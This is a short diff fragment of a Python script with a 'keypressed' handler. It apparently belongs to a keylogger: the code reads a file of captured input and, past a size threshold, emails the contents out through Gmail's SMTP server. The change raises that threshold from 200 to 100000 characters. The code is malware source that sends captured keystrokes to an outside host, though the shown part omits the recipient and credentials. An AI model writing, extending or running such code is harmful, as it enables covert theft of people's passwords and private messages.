@@ -21,7 +21,7 @@ def keypressed(key):
             file_contents = file.read()
             print(file_contents)
             num_characters = float(len(file_contents))
-            if num_characters >= 200:
+            if num_characters >= 100000:
                 message = file_contents
                 with smtplib.SMTP('smtp.gmail.com','587') as smtpserver:
                     smtpserver.ehlo()
